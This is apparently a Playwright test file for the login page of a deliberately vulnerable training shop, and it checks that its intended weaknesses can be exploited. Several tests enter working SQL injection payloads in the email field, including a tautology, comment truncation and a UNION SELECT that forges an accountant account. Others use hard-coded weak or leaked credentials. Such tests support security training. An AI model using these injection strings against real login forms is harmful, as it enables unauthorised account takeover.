const { test, expect } = require('@playwright/test');

test.beforeEach(async ({ context }) => {
  await context.addCookies([
    { name: 'cookieconsent_status', value: 'dismiss', domain: 'localhost', path: '/' },
    { name: 'welcomebanner_status', value: 'dismiss', domain: 'localhost', path: '/' },
    { name: 'language', value: 'en', domain: 'localhost', path: '/' },
  ]);
});

test.beforeEach(async ({ page }) => {
  await page.goto('/#/login');
});

test.describe('/#/login', () => {
  test('should log in Admin with SQLI attack on email field using "\' or 1=1--"', async ({ page }) => {
    await page.fill('#email', "' or 1=1--");
    await page.fill('#password', 'a');
    await page.click('#loginButton');
  });

  test('should log in Admin with SQLI attack on email field using "admin@<juice-sh.op>\'--"', async ({ page }) => {
    await page.fill('#email', `admin@${process.env.APPLICATION_DOMAIN}'--`);
    await page.fill('#password', 'a');
    await page.click('#loginButton');
    await expect(page).toHaveURL(/\/search$/);
  });

  test('should log in Jim with SQLI attack on email field using "jim@<juice-sh.op>\'--"', async ({ page }) => {
    await page.fill('#email', `jim@${process.env.APPLICATION_DOMAIN}'--`);
    await page.fill('#password', 'a');
    await page.click('#loginButton');
    await expect(page).toHaveURL(/\/search$/);
  });

  test('should log in Bender with SQLI attack on email field using "bender@<juice-sh.op>\'--"', async ({ page }) => {
    await page.fill('#email', `bender@${process.env.APPLICATION_DOMAIN}'--`);
    await page.fill('#password', 'a');
    await page.click('#loginButton');
    await expect(page).toHaveURL(/\/search$/);
  });

  test('should be able to log in with original (weak) admin credentials', async ({ page }) => {
    await page.fill('#email', `admin@${process.env.APPLICATION_DOMAIN}`);
    await page.fill('#password', 'admin123');
    await page.click('#loginButton');
    await expect(page).toHaveURL(/\/search$/);
  });

  test('should be able to log in with original support-team credentials', async ({ page }) => {
    await page.fill('#email', `support@${process.env.APPLICATION_DOMAIN}`);
    await page.fill('#password', 'J6aVjTgOpRs@?5l!Zkq2AYnCE@RF$P');
    await page.click('#loginButton');
    await expect(page).toHaveURL(/\/search$/);
  });

  test('should be able to log in with original MC SafeSearch credentials', async ({ page }) => {
    await page.fill('#email', `mc.safesearch@${process.env.APPLICATION_DOMAIN}`);
    await page.fill('#password', 'Mr. N00dles');
    await page.click('#loginButton');
    await expect(page).toHaveURL(/\/search$/);
  });

  test('should be able to log in with original Amy credentials', async ({ page }) => {
    await page.fill('#email', `amy@${process.env.APPLICATION_DOMAIN}`);
    await page.fill('#password', 'K1f.....................');
    await page.click('#loginButton');
    await expect(page).toHaveURL(/\/search$/);
  });

  test('should be able to log in with original Jannik credentials', async ({ page }) => {
    await page.fill('#email', `J12934@${process.env.APPLICATION_DOMAIN}`);
    await page.fill('#password', '0Y8rMnww$*9VFYE§59-!Fg1L6t&6lB');
    await page.click('#loginButton');
    await expect(page).toHaveURL(/\/search$/);
  });

  test('should be able to log into a existing 2fa protected account given the right token', async ({ page }) => {
    await page.fill('#email', `wurstbrot@${process.env.APPLICATION_DOMAIN}'--`);
    await page.fill('#password', 'Never mind...');
    await page.click('#loginButton');

    const totpToken = await page.evaluate(() => {
      return window.crypto.getRandomValues(new Uint32Array(1))[0];
    }).then(token => `00${token.toString(10).padEnd(6, '0')}`);

    await page.fill('#totpToken', totpToken);
    await page.click('#totpSubmitButton');
    await expect(page).toHaveURL(/\/search$/);
  });

  test('should be able to log in as bjoern.kimminich@gmail.com with base64-encoded email as password', async ({ page }) => {
    await page.fill('#email', 'bjoern.kimminich@gmail.com');
    await page.fill('#password', 'bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=');
    await page.click('#loginButton');

    await expect(page).toHaveURL(/\/search$/);
  });

  test('should be able to log in as chris.pike@juice-sh.op by using "\' or deletedAt IS NOT NULL --"', async ({ page }) => {
    await page.fill('#email', "' or deletedAt IS NOT NULL--");
    await page.fill('#password', 'a');
    await page.click('#loginButton');
    await expect(page).toHaveURL(/\/search$/);
  });

  test('should be able to log in as chris.pike@juice-sh.op by using "chris.pike@juice-sh.op\' --"', async ({ page }) => {
    await page.fill('#email', `chris.pike@${process.env.APPLICATION_DOMAIN}'--`);
    await page.fill('#password', 'a');
    await page.click('#loginButton');
    await expect(page).toHaveURL(/\/search$/);
  });

  test('should log in non-existing accountant user with SQLI attack on email field using UNION SELECT payload', async ({ page }) => {
    await page.fill('#email', 
      "' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 'acc0unt4nt@juice-sh.op' as 'email', '12345' as 'password', 'accounting' as 'role', '123' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp' , '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '1999-08-16 14:14:41.644 +00:00' as 'createdAt', '1999-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--"
    );
    await page.fill('#password', 'a');
    await page.click('#loginButton');
    await expect(page).toHaveURL(/\/search$/);
  });

  test('should be able to log in with testing credentials that are leaked on client', async ({ page }) => {
    await page.fill('#email', `testing@${process.env.APPLICATION_DOMAIN}`);
    await page.fill('#password', 'IamUsedForTesting');
    await page.click('#loginButton');
    await expect(page).toHaveURL(/\/search$/);
  });
});
